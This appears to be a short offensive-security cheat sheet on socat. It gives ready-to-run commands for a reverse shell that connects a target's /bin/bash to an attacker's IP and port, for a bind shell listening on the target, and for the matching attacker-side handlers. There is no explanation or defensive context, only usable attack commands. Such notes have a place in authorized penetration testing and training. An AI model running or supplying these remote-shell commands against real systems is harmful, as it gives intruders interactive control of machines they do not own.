# Socat

## Reverse Shell

Shell handler (attacker).

```
$ socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
```

Connect to attacker.

```
$ socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_IP>:<attacker_PORT>
```

## Bind Shell

Target.

```
$ socat tcp-listen:<PORT>,reuseaddr,fork exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane
```

Shell handler.

```
$ socat file:`tty`,raw,echo=0 tcp:<target_IP>:<target_PORT>
```